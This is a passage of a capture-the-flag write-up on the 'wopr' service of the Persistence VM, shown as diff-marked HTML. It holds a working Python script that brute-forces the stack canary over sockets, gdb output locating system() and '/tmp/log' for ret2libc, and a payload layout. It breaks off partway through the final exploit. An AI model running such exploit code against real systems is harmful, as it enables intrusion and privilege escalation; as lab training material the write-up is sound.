+     Fork<span style="color:#ff79c6">()</span> causes creation of a new process.  The new process <span style="color:#ff79c6">(</span>child process<span style="color:#ff79c6">)</span>
+     is an exact copy of the calling process <span style="color:#ff79c6">(</span>parent process<span style="color:#ff79c6">)</span> except <span style="color:#ff79c6">for</span> the
+     following:
+
+ <span style="color:#ff79c6">[</span>.. snip ..<span style="color:#ff79c6">]</span>
+</code></pre></div><p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>
+<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>
+<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) -&gt; xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>
+<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# telnet 127.0.0.1 <span style="color:#bd93f9">3333</span>
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is <span style="color:#f1fa8c">&#39;^]&#39;</span>.
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> hello, my name is sploitable
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> would you like to play a game?
+&gt; A
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> yeah, I don<span style="color:#f1fa8c">&#39;t think so
+</span><span style="color:#f1fa8c">[+] bye!                           # &lt;-- We have a bye!
+</span><span style="color:#f1fa8c">Connection closed by foreign host.
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">root@kali:~# telnet 127.0.0.1 3333
+</span><span style="color:#f1fa8c">Trying 127.0.0.1...
+</span><span style="color:#f1fa8c">Connected to 127.0.0.1.
+</span><span style="color:#f1fa8c">Escape character is &#39;</span>^<span style="color:#ff79c6">]</span><span style="color:#f1fa8c">&#39;.
+</span><span style="color:#f1fa8c">[+] hello, my name is sploitable
+</span><span style="color:#f1fa8c">[+] would you like to play a game?
+</span><span style="color:#f1fa8c">&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span style="color:#f1fa8c">[+] yeah, I don&#39;</span>t think so
+Connection closed by foreign host. <span style="color:#6272a4"># &lt;-- No bye!</span>
+</code></pre></div><p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> socket
+<span style="color:#ff79c6">import</span> sys
+
+payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">30</span>  <span style="color:#6272a4"># amount of bytes before the first canary bit is hit</span>
+canary <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>         <span style="color:#6272a4"># the canary</span>
+
+<span style="color:#6272a4"># start the canary brute loop. We want to brute 4 bytes ...</span>
+<span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">xrange</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">5</span>):
+
+    <span style="color:#6272a4"># ... and try all possibilities</span>
+    <span style="color:#ff79c6">for</span> canary_byte <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">xrange</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">256</span>):
+
+        <span style="color:#6272a4"># prepare the byte</span>
+        hex_byte <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(canary_byte)
+
+        <span style="color:#6272a4"># prepare the payload</span>
+        send <span style="color:#ff79c6">=</span> payload <span style="color:#ff79c6">+</span> canary <span style="color:#ff79c6">+</span> hex_byte
+
+        <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Trying: &#39;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">x{0}&#39; in payload &#39;</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39; (</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">/255)&#34;</span><span style="color:#ff79c6">.</span>format(hex_byte<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#34;hex&#34;</span>)) <span style="color:#ff79c6">%</span> (send, x, canary_byte)
+
+        sock <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+        sock<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#bd93f9">3333</span>))
+
+        <span style="color:#6272a4"># get the inital banners</span>
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">35</span>)   <span style="color:#6272a4"># [+] hello, my name is sploitable\n</span>
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">40</span>)   <span style="color:#6272a4"># [+] would you like to play a game?\n</span>
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">5</span>)    <span style="color:#6272a4"># &gt;</span>
+
+        <span style="color:#6272a4"># send the payload</span>
+        sock<span style="color:#ff79c6">.</span>send(send)
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">27</span>)   <span style="color:#6272a4"># [+] yeah, I don&#39;t think so\n</span>
+
+        <span style="color:#6272a4"># if we have a OK response, then we will have this last part</span>
+        <span style="color:#6272a4"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
+        data <span style="color:#ff79c6">=</span>  sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">64</span>)   <span style="color:#6272a4"># [+] bye!\n</span>
+        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;bye&#34;</span> <span style="color:#ff79c6">in</span> data:
+            <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[!!] Found a possible canary value of &#39;{0}&#39;!&#34;</span><span style="color:#ff79c6">.</span>format(hex_byte<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#34;hex&#34;</span>))
+            canary <span style="color:#ff79c6">+=</span> hex_byte
+            sock<span style="color:#ff79c6">.</span>close()
+            <span style="color:#ff79c6">break</span>
+
+        sock<span style="color:#ff79c6">.</span>close()
+
+    <span style="color:#6272a4"># if we cant even find the first byte, we failed already</span>
+    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(canary) <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>:
+        <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[-] Unable to even find the first bit. No luck&#34;</span>
+        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0</span>)
+
+<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(canary) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>:
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Canary seems to be {0}&#34;</span><span style="color:#ff79c6">.</span>format(canary<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#34;hex&#34;</span>))
+<span style="color:#ff79c6">else</span>:
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[-] Unable to brute canary&#34;</span>
+</code></pre></div><p>An example run of this would end as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Trying: <span style="color:#f1fa8c">&#39;\x8d&#39;</span> in payload <span style="color:#f1fa8c">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style="color:#ff79c6">(</span>4:141/255<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Trying: <span style="color:#f1fa8c">&#39;\x8e&#39;</span> in payload <span style="color:#f1fa8c">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style="color:#ff79c6">(</span>4:142/255<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Trying: <span style="color:#f1fa8c">&#39;\x8f&#39;</span> in payload <span style="color:#f1fa8c">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style="color:#ff79c6">(</span>4:143/255<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Trying: <span style="color:#f1fa8c">&#39;\x90&#39;</span> in payload <span style="color:#f1fa8c">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span style="color:#ff79c6">(</span>4:144/255<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>!!<span style="color:#ff79c6">]</span> Found a possible canary value of <span style="color:#f1fa8c">&#39;90&#39;</span>!
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Canary seems to be 00ef8d90
+</code></pre></div><p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>
+<h2 id="wopr---nx-and-eip">wopr - NX and EIP</h2>
+<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>
+<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>
+<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.1$ ldd /usr/local/bin/wopr
+    linux-gate.so.1 <span style="color:#ff79c6">=</span>&gt;  <span style="color:#ff79c6">(</span>0xb7fff000<span style="color:#ff79c6">)</span>
+    libc.so.6 <span style="color:#ff79c6">=</span>&gt; /lib/libc.so.6 <span style="color:#ff79c6">(</span>0xb7e62000<span style="color:#ff79c6">)</span>
+    /lib/ld-linux.so.2 <span style="color:#ff79c6">(</span>0x00110000<span style="color:#ff79c6">)</span>
+
+bash-4.1$ ldd /usr/local/bin/wopr
+    linux-gate.so.1 <span style="color:#ff79c6">=</span>&gt;  <span style="color:#ff79c6">(</span>0xb7fff000<span style="color:#ff79c6">)</span>
+    libc.so.6 <span style="color:#ff79c6">=</span>&gt; /lib/libc.so.6 <span style="color:#ff79c6">(</span>0xb7e62000<span style="color:#ff79c6">)</span>
+    /lib/ld-linux.so.2 <span style="color:#ff79c6">(</span>0x00110000<span style="color:#ff79c6">)</span>
+</code></pre></div><p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>
+<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.1$ <span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">SHELL</span><span style="color:#ff79c6">=</span>/bin/bash
+
+bash-4.1$ gdb -q /usr/bin/telnet
+Reading symbols from /usr/bin/telnet...<span style="color:#ff79c6">(</span>no debugging symbols found<span style="color:#ff79c6">)</span>...done.
+Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
+<span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> b *main   <span style="color:#6272a4"># set a breakpoint to stop the flow once we hit the main() func</span>
+Breakpoint <span style="color:#bd93f9">1</span> at 0x7b90
+
+<span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> r         <span style="color:#6272a4"># run the program</span>
+Starting program: /usr/bin/telnet
+Breakpoint 1, 0x00117b90 in main <span style="color:#ff79c6">()</span>
+
+<span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> p system  <span style="color:#6272a4"># We hit our breakpoint, lets leak the address for system()</span>
+<span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{</span>&lt;text variable, no debug info&gt;<span style="color:#ff79c6">}</span> 0xb7e56210 &lt;system&gt;
+<span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span>
+</code></pre></div><p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>
+<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
+
+[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
+ ^~ Initial BF    ^~ Bruted cookie                    ^~ system()
+
+- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
+</code></pre></div><p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>
+<h2 id="wopr---code-exec">wopr - code exec</h2>
+<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>
+<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>
+<p>I tried to put a command in a env variable and failed.
+I attempted to write a ROP chain and failed.</p>
+<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>
+<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>
+<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>
+<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/persistence# strings  wopr
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+
+<span style="color:#ff79c6">[</span>.. snip ..<span style="color:#ff79c6">]</span>
+
+<span style="color:#ff79c6">[</span>^_<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> yeah, I don&#39;t think so
+socket
+setsockopt
+<span style="color:#8be9fd;font-style:italic">bind</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> <span style="color:#8be9fd;font-style:italic">bind</span> <span style="color:#8be9fd;font-style:italic">complete</span>
+listen
+/tmp/log          <span style="color:#6272a4"># &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
+TMPLOG
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> waiting <span style="color:#ff79c6">for</span> connections
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> logging queries to <span style="color:#8be9fd;font-style:italic">$TMPLOG</span>
+accept
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> got a connection
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> hello, my name is sploitable
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> would you like to play a game?
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> bye!
+</code></pre></div><p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>
+<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>
+<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# gdb -q ./wopr
+Reading symbols from wopr...<span style="color:#ff79c6">(</span>no debugging symbols found<span style="color:#ff79c6">)</span>...done.
+
+gdb-peda$ b *main
+Breakpoint <span style="color:#bd93f9">1</span> at 0x80487de
+
+gdb-peda$ r
+<span style="color:#ff79c6">[</span>----------------------------------registers-----------------------------------<span style="color:#ff79c6">]</span>
+EAX: 0xbffff4a4 --&gt; 0xbffff60a <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;wopr&#34;</span><span style="color:#ff79c6">)</span>
+EBX: 0xb7fbfff4 --&gt; 0x14bd7c
+ECX: 0x66a6f92e
+EDX: 0x1
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff478 --&gt; 0x0
+ESP: 0xbffff3fc --&gt; 0xb7e8ae36 <span style="color:#ff79c6">(</span>&lt;__libc_start_main+230&gt;:    mov    DWORD PTR <span style="color:#ff79c6">[</span>esp<span style="color:#ff79c6">]</span>,eax<span style="color:#ff79c6">)</span>
+EIP: 0x80487de <span style="color:#ff79c6">(</span>&lt;main&gt;: push   ebp<span style="color:#ff79c6">)</span>
+EFLAGS: 0x246 <span style="color:#ff79c6">(</span>carry PARITY adjust ZERO sign <span style="color:#8be9fd;font-style:italic">trap</span> INTERRUPT direction overflow<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>-------------------------------------code-------------------------------------<span style="color:#ff79c6">]</span>
+   0x80487d7 &lt;get_reply+99&gt;:    call   0x804865c &lt;__stack_chk_fail@plt&gt;
+   0x80487dc &lt;get_reply+104&gt;:   leave
+   0x80487dd &lt;get_reply+105&gt;:   <span style="color:#8be9fd;font-style:italic">ret</span>
+<span style="color:#ff79c6">=</span>&gt; 0x80487de &lt;main&gt;:    push   ebp
+   0x80487df &lt;main+1&gt;:  mov    ebp,esp
+   0x80487e1 &lt;main+3&gt;:  sub    esp,0x258
+   0x80487e7 &lt;main+9&gt;:  mov    eax,DWORD PTR <span style="color:#ff79c6">[</span>ebp+0x8<span style="color:#ff79c6">]</span>
+   0x80487ea &lt;main+12&gt;: mov    DWORD PTR <span style="color:#ff79c6">[</span>ebp-0x23c<span style="color:#ff79c6">]</span>,eax
+<span style="color:#ff79c6">[</span>------------------------------------stack-------------------------------------<span style="color:#ff79c6">]</span>
+0000| 0xbffff3fc --&gt; 0xb7e8ae36 <span style="color:#ff79c6">(</span>&lt;__libc_start_main+230&gt;:   mov    DWORD PTR <span style="color:#ff79c6">[</span>esp<span style="color:#ff79c6">]</span>,eax<span style="color:#ff79c6">)</span>
+0004| 0xbffff400 --&gt; 0x1
+0008| 0xbffff404 --&gt; 0xbffff4a4 --&gt; 0xbffff60a <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;wopr&#34;</span><span style="color:#ff79c6">)</span>
+0012| 0xbffff408 --&gt; 0xbffff4ac --&gt; 0xbffff629 <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;SSH_AGENT_PID=3171&#34;</span><span style="color:#ff79c6">)</span>
+0016| 0xbffff40c --&gt; 0xb7fe08d8 --&gt; 0xb7e74000 --&gt; 0x464c457f
+0020| 0xbffff410 --&gt; 0xb7ff6821 <span style="color:#ff79c6">(</span>mov    eax,DWORD PTR <span style="color:#ff79c6">[</span>ebp-0x10<span style="color:#ff79c6">])</span>
+0024| 0xbffff414 --&gt; 0xffffffff
+0028| 0xbffff418 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
+<span style="color:#ff79c6">[</span>------------------------------------------------------------------------------<span style="color:#ff79c6">]</span>
+Legend: code, data, rodata, value
+Breakpoint 1, 0x080487de in main <span style="color:#ff79c6">()</span>
+
+gdb-peda$ searchmem /tmp/log
+Searching <span style="color:#ff79c6">for</span> <span style="color:#f1fa8c">&#39;/tmp/log&#39;</span> in: None ranges
+Found <span style="color:#bd93f9">2</span> results, display max <span style="color:#bd93f9">2</span> items:
+wopr : 0x8048c60 <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/tmp/log&#34;</span><span style="color:#ff79c6">)</span>
+wopr : 0x8049c60 <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/tmp/log&#34;</span><span style="color:#ff79c6">)</span>
+</code></pre></div><p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>
+<h2 id="wopr---the-exploit">wopr - the exploit</h2>
+<p>To sum up what we have to do to exploit this, we can say that we have to:</p>
+<ul>
+<li>Provide a string of size 30</li>
+<li>Provide the canary we have brute forced</li>
+<li>Pad with 4 bytes</li>
+<li>Write EIP to the location of <code>system()</code></li>
+<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
+<li>Provide the location of <code>/tmp/log</code></li>
+</ul>
+<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34; + &#34;\xff\xff\xff\xff&#34; + &#34;AAAA&#34; +
+&#34;\x10\xc2\x16\x00&#34; + &#34;JUNK&#34; + &#34;\x60\x8c\x04\x08&#34;
+</code></pre></div><p>I finished up coding the exploit, which eventually resulted in the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> socket
+<span style="color:#ff79c6">import</span> sys
+<span style="color:#ff79c6">import</span> os
+
+payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">30</span>  <span style="color:#6272a4"># amount of bytes to before the canary is hit</span>
+canary <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>     <span style="color:#6272a4"># canary that should update as its bruted</span>
+
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">            A: &#34;So, I heard you like pain...?&#34;
+</span><span style="color:#f1fa8c">            B: &#34;... a bit&#34;
+</span><span style="color:#f1fa8c">            C: &#34;Well, here it is, the: &#34;
+</span><span style="color:#f1fa8c"> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
+</span><span style="color:#f1fa8c">|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
+</span><span style="color:#f1fa8c">|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
+</span><span style="color:#f1fa8c">|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
+</span><span style="color:#f1fa8c">|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
+</span><span style="color:#f1fa8c">|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
+</span><span style="color:#f1fa8c">|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
+</span><span style="color:#f1fa8c">      _____ ____  _       ___  ____  ______
+</span><span style="color:#f1fa8c">     / ___/|    \| |     /   \|    ||      |
+</span><span style="color:#f1fa8c">    (   \_ |  o  ) |    |     ||  | |      |
+</span><span style="color:#f1fa8c">     \__  ||   _/| |___ |  O  ||  | |_|  |_|
+</span><span style="color:#f1fa8c">     /  \ ||  |  |     ||     ||  |   |  |
+</span><span style="color:#f1fa8c">     \    ||  |  |     ||     ||  |   |  |
+</span><span style="color:#f1fa8c">      \___||__|  |_____| \___/|____|  |__|
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">                A: &#34;AKA: FU superkojiman &amp;&amp; sagi- !!&#34;
+</span><span style="color:#f1fa8c">                A: &#34;I also have no idea what I am doing&#34;
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Connecting &amp; starting canary brute force...&#34;</span>
+
+<span style="color:#6272a4"># start the canary brute loop. We want to brute 4 bytes ...</span>
+<span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">xrange</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">5</span>):
+
+    <span style="color:#6272a4"># ... and try all possibilities</span>
+    <span style="color:#ff79c6">for</span> canary_byte <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">xrange</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">256</span>):
+
+        <span style="color:#6272a4"># prepare the byte</span>
+        hex_byte <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(canary_byte)
+
+        <span style="color:#6272a4"># prepare the payload</span>
+        send <span style="color:#ff79c6">=</span> payload <span style="color:#ff79c6">+</span> canary <span style="color:#ff79c6">+</span> hex_byte
+
+        <span style="color:#6272a4"># connect and send payload</span>
+        sock <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+        sock<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#bd93f9">3333</span>))
+
+        <span style="color:#6272a4"># get the inital banners</span>
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">35</span>)   <span style="color:#6272a4"># [+] hello, my name is sploitable\n</span>
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">40</span>)   <span style="color:#6272a4"># [+] would you like to play a game?\n</span>
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">5</span>)    <span style="color:#6272a4"># &gt;</span>
+
+        <span style="color:#6272a4"># send the payload</span>
+        sock<span style="color:#ff79c6">.</span>send(send)
+        sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">27</span>)   <span style="color:#6272a4"># [+] yeah, I don&#39;t think so\n</span>
+
+        <span style="color:#6272a4"># if we have a OK response, then we will have this last part</span>
+        <span style="color:#6272a4"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
+        data <span style="color:#ff79c6">=</span>  sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">64</span>)   <span style="color:#6272a4"># [+] bye!\n</span>
+        <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;bye&#34;</span> <span style="color:#ff79c6">in</span> data:
+            <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Found a possible canary value of &#39;{0}&#39;!&#34;</span><span style="color:#ff79c6">.</span>format(hex_byte<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#34;hex&#34;</span>))
+            canary <span style="color:#ff79c6">+=</span> hex_byte
+            sock<span style="color:#ff79c6">.</span>close()
+            <span style="color:#ff79c6">break</span>
+
+        sock<span style="color:#ff79c6">.</span>close()
+    <span style="color:#6272a4"># if we cant even find the first byte, we failed already</span>
+    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(canary) <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>:
+        <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[-] Unable to even find the first bit of the canary. No luck&#34;</span>
+        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0</span>)
+
+<span style="color:#6272a4"># The canary is our ticket out of here!</span>
+<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(canary) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>:
+
